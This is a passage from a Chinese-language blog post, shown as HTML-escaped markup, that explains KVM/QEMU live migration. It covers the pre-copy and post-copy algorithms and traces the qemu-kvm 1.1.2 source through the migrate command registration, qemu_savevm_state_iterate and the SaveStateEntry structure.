TARGET_PAGE_SIZE,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                             DIRTY_MEMORY_MIGRATION)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    memory_region_set_dirty(block-&amp;gt;mr, addr, TARGET_PAGE_SIZE);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        memory_global_dirty_log_start();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        qemu_put_be64(f, ram_bytes_total() | RAM_SAVE_FLAG_MEM_SIZE);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        QLIST_FOREACH(block, &amp;amp;ram_list.blocks, next) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            qemu_put_byte(f, &lt;span class=&quot;built_in&quot;&gt;strlen&lt;/span&gt;(block-&amp;gt;idstr));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            qemu_put_buffer(f, (&lt;span class=&quot;keyword&quot;&gt;uint8_t&lt;/span&gt; *)block-&amp;gt;idstr, &lt;span class=&quot;built_in&quot;&gt;strlen&lt;/span&gt;(block-&amp;gt;idstr));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            qemu_put_be64(f, block-&amp;gt;length);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    bytes_transferred_last = bytes_transferred;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    bwidth = qemu_get_clock_ns(rt_clock);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt; ((ret = qemu_file_rate_limit(f)) == &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; bytes_sent;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        bytes_sent = ram_save_block(f);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        bytes_transferred += bytes_sent;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (bytes_sent == &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &amp;#123; &lt;span class=&quot;comment&quot;&gt;/* no more blocks */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (ret &amp;lt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        return ret;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    bwidth = qemu_get_clock_ns(rt_clock) - bwidth;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    bwidth = (bytes_transferred - bytes_transferred_last) / bwidth;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;/* if we haven&#39;t transferred anything this round, force expected_time to a&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;     * a very high value, but without crashing */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (bwidth == &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        bwidth = &lt;span class=&quot;number&quot;&gt;0.000001&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;/* try transferring iterative blocks of memory */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (stage == &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; bytes_sent;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;/* flush all remaining blocks regardless of rate limiting */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt; ((bytes_sent = ram_save_block(f)) != &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            bytes_transferred += bytes_sent;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        memory_global_dirty_log_stop();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    qemu_put_be64(f, RAM_SAVE_FLAG_EOS);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    expected_time = ram_save_remaining() * TARGET_PAGE_SIZE / bwidth;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    return (stage == &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;) &amp;amp;&amp;amp; (expected_time &amp;lt;= migrate_max_downtime());&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;第一阶段，（14-42），代码所有的内存被标记为脏页并初始化页面更新追踪机制&lt;/li&gt;
&lt;li&gt;第二阶段，（47-55），如果页面被标记为脏页，则传输这些页面，页面脏位被重置，如果有程序修改页面，页面的脏位又可设置。一般来说，第二阶段是迭代过程最长的&lt;/li&gt;
&lt;li&gt;第三阶段，（71-79），那些修改过的却还没有来得及被传输到目的端的页面可以用来计算停机时间，设置一个目标停机时间，当达到这个值的时候，停止第二阶段的迭代过程，进入第三阶段，这时源虚拟机被暂停，将剩余的页面、CPU等状态一同传输到目的端，目的端再重新恢复虚拟机。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;pre-copy总体来说能带来很小的停机时间，但不太适合写密集型的负载，写密集型负载会大量更新页面，使得迭代过程结束后的剩余页面增多，延长停机时间。&lt;/p&gt;
&lt;p&gt;下面再来看看post-copy算法&lt;/p&gt;
&lt;p&gt;Post-copy算法的思想是先暂停源虚拟机，把能保证一次正常运行的最小运行集（所有的CPU状态）传输到目的端，目的端恢复虚拟机的执行，若需要内存页，则产生页错误，主动从源虚拟机中获取。Post-copy能保证尽可能的做到个内存也最多只传输一次，避免pre-copy算法迭代过程中的重复传输；由于不断地从源端获取丢失页，不可避免地带来性能损失。&lt;a href=&quot;http://www.cs.binghamton.edu/~mhines/papers/vee2009.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;VEE’09 Post-Copy Based Live Virtual Machine Migration Using Adaptive Pre-Paging and Dynamic Self-Ballooning&lt;/a&gt; 利用了一种称之为&lt;code&gt;adaptive pre-paging&lt;/code&gt;的方法来减少页错误，&lt;code&gt;adaptive pre-paging&lt;/code&gt;能尽可能的预测出目的端下一个需要的页面，从而减少页面传输的次数。&lt;/p&gt;
&lt;h2 id=&quot;实现-Pre-copy&quot;&gt;&lt;a href=&quot;#实现-Pre-copy&quot; class=&quot;headerlink&quot; title=&quot;实现 Pre-copy&quot;&gt;&lt;/a&gt;实现 Pre-copy&lt;/h2&gt;&lt;p&gt;这一章节主要讲述KVM/Qemu关于Pre-copy迁移算法的实现，基于qemu-kvm-1.1.2版本。首先看一下源码中的hmp-commands.hx文件内容：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        .name       = &amp;quot;migrate&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        .args_type  = &amp;quot;detach:-d,blk:-b,inc:-i,uri:s&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        .params     = &amp;quot;[-d] [-b] [-i] uri&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        .help       = &amp;quot;migrate to URI (using -d to not wait for completion)&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		      &amp;quot;\n\t\t\t -b for migration without shared storage with&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		      &amp;quot; full copy of disk\n\t\t\t -i for migration without &amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		      &amp;quot;shared storage with incremental copy of disk &amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		      &amp;quot;(base image shared between src and destination)&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        .mhandler.cmd = hmp_migrate,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;STEXI&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;@item migrate [-d] [-b] [-i] @var&amp;#123;uri&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;@findex migrate&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Migrate to @var&amp;#123;uri&amp;#125; (using -d to not wait for completion).&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	-b for migration with full copy of disk&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	-i for migration with incremental copy of disk (base image is shared)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ETEXI&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;每一个Qemu相关命令都需要在此文件中注册，如savevm,snapshot,migrate等，如果想自定义命令，亦是如此，关于如何修改KVM/Qemu源码，可以结合我的 &lt;a href=&quot;http://www.chongh.wiki/blog/2016/01/01/kvm-qemu-bytalk/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;上一篇&lt;/a&gt; 文章.&lt;/p&gt;
&lt;p&gt;Qemu-kvm利用&lt;code&gt;hmp-commands.hx&lt;/code&gt;这个文件保存相应的命令行参数以及常量，然后使用&lt;code&gt;hxtool&lt;/code&gt;工具产生对应的头文件&lt;code&gt;hmp-commands.h&lt;/code&gt;到&lt;code&gt;./x86_64-softmmu&lt;/code&gt;文件夹中，这个过程自动进行。注，STEXI与ETEXI之间的内容属于注释内容。从代码中可看到，与迁移命令migrate相对应的处理函数是&lt;code&gt;hmp_migrate&lt;/code&gt;,从&lt;code&gt;hmp_migrate&lt;/code&gt;函数开始，会依次调用&lt;code&gt;qmp_migrate&lt;/code&gt;,&lt;code&gt;tcp_start_outgoing_migration&lt;/code&gt;,&lt;code&gt;migrate_fd_connect&lt;/code&gt;, &lt;code&gt;migrate_fd_put_ready&lt;/code&gt;,具体可看源码，不一一详细介绍。&lt;/p&gt;
&lt;p&gt;重点说一下&lt;code&gt;migrate_fd_connect&lt;/code&gt;函数与&lt;code&gt;migrate_fd_put_ready&lt;/code&gt;函数，&lt;br&gt;&lt;code&gt;migrate_fd_connect&lt;/code&gt;函数主要调用了&lt;code&gt;qemu_savevm_state_begin&lt;/code&gt;函数进行迁移工作的初始化工作（对应于前文说的迁移过程的第一阶段），而&lt;code&gt;migrate_fd_connect&lt;/code&gt;函数主要调用了&lt;code&gt;qemu_savevm_state_iterate&lt;/code&gt;函数（对应第二阶段）与&lt;code&gt;qemu_savevm_state_complete&lt;/code&gt;函数（对应第三阶段），这里注意，此三个函数（&lt;code&gt;qemu_savevm_state_beging&lt;/code&gt;,&lt;code&gt;qemu_savevm_state_iterate&lt;/code&gt;,&lt;code&gt;qemu_savevm_state_complete&lt;/code&gt;)里面代码结构非同类似，必有蹊跷，这里贴出其中的&lt;code&gt;qemu_savevm_state_iterate&lt;/code&gt;函数：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;qemu_savevm_state_iterate&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(QEMUFile *f)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SaveStateEntry *se;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; ret = &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    QTAILQ_FOREACH(se, &amp;amp;savevm_handlers, entry) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (se-&amp;gt;save_live_state == &lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;continue&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;/* Section type */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        qemu_put_byte(f, QEMU_VM_SECTION_PART);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        qemu_put_be32(f, se-&amp;gt;section_id);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        ret = se-&amp;gt;save_live_state(f, QEMU_VM_SECTION_PART, se-&amp;gt;opaque);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (ret &amp;lt;= &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;comment&quot;&gt;/* Do not proceed to the next vmstate before this one reported&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;               completion of the current stage. This serializes the migration&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;               and reduces the probability that a faster changing state is&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;               synchronized over and over again. */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (ret != &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        return ret;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ret = qemu_file_get_error(f);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (ret != &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        qemu_savevm_state_cancel(f);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    return ret;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;三个函数都会有一句代码&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ret = se-&amp;gt;save_live_state(f, QEMU_VM_SECTION_PART, se-&amp;gt;opaque); 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;只是其中参数不同。&lt;/p&gt;
&lt;p&gt;这个save_live_state是什么？&lt;/p&gt;
&lt;p&gt;注意，非常重要，存在于虚拟机迁移的核心结构体SaveStateEntry中：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; SaveStateEntry &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    QTAILQ_ENTRY(SaveStateEntry) entry;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; idstr[&lt;span class=&quot;number&quot;&gt;256&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; instance_id;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; alias_id;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; version_id;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; section_id;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SaveSetParamsHandler *set_params;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SaveLiveStateHandler *save_live_state;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SaveStateHandler *save_state;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    LoadStateHandler *load_state;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; VMStateDescription *vmsd;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; *opaque;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    CompatEntry *compat;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; no_migrate;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; is_ram;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125; SaveStateEntry;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;此结构体存储了虚拟机迁移的用到的所有数据结构，主要包括被传输设备的存储格式以及被调用的具体设备的迁移功能函数. 那指针 &lt;code&gt;*save_live_state&lt;/code&gt; 到底做了什么，一一追踪可发现，在&lt;code&gt;vl.c&lt;/code&gt;文件中的main函数中（整个qemu程序的开始),针对ram设备，可发现如下一段代码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;register_savevm_live(NULL, &amp;quot;ram&amp;quot;, 0, 4, NULL, ram_save_live, NULL, ram_load, NULL);
